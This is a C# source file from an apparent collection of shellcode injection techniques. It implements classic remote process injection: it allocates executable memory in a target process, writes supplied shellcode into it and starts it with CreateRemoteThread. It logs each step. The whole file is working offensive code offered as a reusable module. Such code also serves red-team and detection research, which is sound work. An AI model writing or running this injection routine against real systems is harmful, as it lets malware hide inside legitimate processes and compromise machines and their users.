using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

using static ShellcodeInjectionTechniques.Debugger;
using static ShellcodeInjectionTechniques.Native;

namespace ShellcodeInjectionTechniques
{
    class ClassicInjection : ITechnique
    {
        public void Run(Process target, byte[] shellcode)
        {
            // allocate some memory for our shellcode
            IntPtr pAddr = VirtualAllocEx(target.Handle, IntPtr.Zero, (UInt32)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.PAGE_EXECUTE_READWRITE);
            Debug("[+] VirtualAllocEx(), assigned: 0x{0}", new string[] { pAddr.ToString("X") });

            // write the shellcode into the allocated memory
            Debug("[+] WriteProcessMemory() - remote address: 0x{0}", new string[] { pAddr.ToString("X") });
            WriteProcessMemory(target.Handle, pAddr, shellcode, shellcode.Length, out IntPtr lpNumberOfBytesWritten);

            // create the remote thread
            IntPtr hThread = CreateRemoteThread(target.Handle, IntPtr.Zero, 0, pAddr, IntPtr.Zero, ThreadCreationFlags.NORMAL, out hThread);
            Debug("[+] CreateRemoteThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
        }
    }
}
